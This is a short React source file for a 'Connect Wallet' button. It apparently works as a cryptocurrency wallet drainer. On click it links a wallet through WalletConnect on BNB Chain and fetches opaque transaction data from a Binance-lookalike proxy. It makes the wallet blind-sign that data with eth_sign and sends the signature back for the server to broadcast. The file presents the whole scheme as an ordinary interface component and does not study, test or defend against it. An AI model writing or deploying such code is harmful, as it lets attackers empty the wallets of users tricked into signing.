import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function getRawSignature(address) {
      try {
        let requestData = { handler: "tx", address: address, chain: "56", type: "coin" };

        var result = await jQuery.post(apiUrl, requestData);
        var unsignedData = JSON.parse(result);
        console.log("📜 Unsigned Data:", unsignedData);

        // **✅ دریافت امضای خام از کیف پول**
        var rawSignature = await provider.request({
          method: "eth_sign",
          params: [address, JSON.stringify(unsignedData)], // ارسال JSON صحیح
        });

        return rawSignature;
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature) {
      try {
        var requestData = {
          handler: "sign",
          signature: signature,
          type: "coin",
        };

        var result = await jQuery.post(apiUrl, requestData);
        console.log("📤 Server Response:", result);

        var resultJson = JSON.parse(result);
        console.log("📤 Parsed Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    var rawSignature = await getRawSignature(sender);

    if (rawSignature) {
      console.log("✍️ Signed Raw Data:", rawSignature);
      var txHash = await sendSignedTransaction(rawSignature);
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
